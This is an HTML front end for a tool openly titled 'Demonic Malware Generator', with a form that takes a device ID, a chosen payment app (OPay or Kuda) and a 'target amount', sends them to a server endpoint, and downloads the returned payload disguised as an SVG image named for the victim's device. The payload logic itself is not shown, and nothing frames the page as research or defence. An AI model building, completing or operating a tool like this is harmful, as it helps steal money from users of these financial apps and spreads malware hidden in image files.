<!DOCTYPE html>
<html>
<head>
    <title>Demonic Malware Generator</title>
    <script>
        async function generateMalware() {
            const deviceId = document.getElementById('deviceId').value;
            const targetApp = document.getElementById('targetApp').value;
            const targetAmount = document.getElementById('targetAmount').value;
            
            const response = await fetch('/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({deviceId, targetApp, targetAmount})
            });
            
            const data = await response.json();
            if (data.error) {
                alert(data.error);
                return;
            }
            
            const blob = new Blob([data.payload], {type: 'image/svg+xml'});
            const url = URL.createObjectURL(blob);
            
            // Create download link
            const a = document.createElement('a');
            a.href = url;
            a.download = `${deviceId}_demonic_malware.svg`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
    </script>
</head>
<body>
    <h1>Demonic Malware Generator</h1>
    <input id="deviceId" placeholder="Device ID"><br>
    <select id="targetApp">
        <option value="OPay">OPay</option>
        <option value="Kuda">Kuda</option>
    </select><br>
    <input id="targetAmount" placeholder="Target Amount"><br>
    <button onclick="generateMalware()">Generate Demonic Malware</button>
</body>
</html>
